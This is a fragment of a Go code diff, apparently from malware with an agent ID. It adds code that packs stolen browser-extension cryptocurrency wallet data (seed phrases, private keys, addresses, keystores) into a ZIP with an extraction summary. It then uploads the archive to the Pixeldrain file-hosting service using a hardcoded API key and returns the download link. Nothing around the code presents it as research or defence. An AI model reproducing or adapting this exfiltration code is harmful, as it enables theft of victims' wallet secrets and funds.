+				keystoresWriter, err := zipWriter.Create(extDir + "keystores.json")
+				if err == nil {
+					keystoresWriter.Write(keystoresJSON)
+				}
+			}
+		}
+	}
+
+	// Add summary file
+	summaryContent := fmt.Sprintf(`Browser Extension Wallet Extraction Summary
+===========================================
+
+Total Extensions Found: %d
+Total Seeds: %d
+Total Private Keys: %d  
+Total Addresses: %d
+Total Keystores: %d
+
+High Value Targets: %s
+
+Extraction Time: %s
+Agent ID: %s
+`, cryptoAssets.TotalExtensions, cryptoAssets.TotalSeeds,
+		cryptoAssets.TotalPrivateKeys, cryptoAssets.TotalAddresses,
+		cryptoAssets.TotalKeystores, strings.Join(cryptoAssets.HighValueTargets, ", "),
+		time.Unix(cryptoAssets.Timestamp, 0).Format("2006-01-02 15:04:05"), cryptoAssets.AgentID)
+
+	summaryWriter, err := zipWriter.Create("summary.txt")
+	if err == nil {
+		summaryWriter.Write([]byte(summaryContent))
+	}
+
+	// Close ZIP writer
+	if err := zipWriter.Close(); err != nil {
+		return "", fmt.Errorf("failed to close ZIP: %v", err)
+	}
+
+	// Get file size
+	fileInfo, err := tempFile.Stat()
+	if err != nil {
+		return "", fmt.Errorf("failed to stat ZIP file: %v", err)
+	}
+
+	// Reopen file for reading
+	tempFile.Seek(0, 0)
+
+	// Create filename with timestamp and agent ID
+	fileName := fmt.Sprintf("browser_wallets_%s_%d.zip", a.ID[:8], time.Now().Unix())
+
+	// Upload to Pixeldrain
+	apiKey := "0c15316a-a603-4e3c-92a1-03d9fc6a9e7a"
+	uploadURL := fmt.Sprintf("https://pixeldrain.com/api/file/%s", fileName)
+
+	// Create request
+	req, err := http.NewRequest("PUT", uploadURL, tempFile)
+	if err != nil {
+		return "", fmt.Errorf("failed to create request: %v", err)
+	}
+
+	// Set authentication
+	req.SetBasicAuth("", apiKey)
+	req.Header.Set("Content-Type", "application/zip")
+	req.ContentLength = fileInfo.Size()
+
+	// Execute request
+	client := &http.Client{Timeout: 5 * time.Minute}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("upload request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// Read response
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("failed to read response: %v", err)
+	}
+
+	if resp.StatusCode != 201 {
+		return "", fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(body))
+	}
+
+	// Parse response to get file ID
+	var uploadResp struct {
+		ID string `json:"id"`
+	}
+	if err := json.Unmarshal(body, &uploadResp); err != nil {
+		return "", fmt.Errorf("failed to parse response: %v", err)
+	}
+
+	// Return download URL
+	downloadURL := fmt.Sprintf("https://pixeldrain.com/u/%s", uploadResp.ID)
+	return downloadURL, nil
 }
 
 func main() {
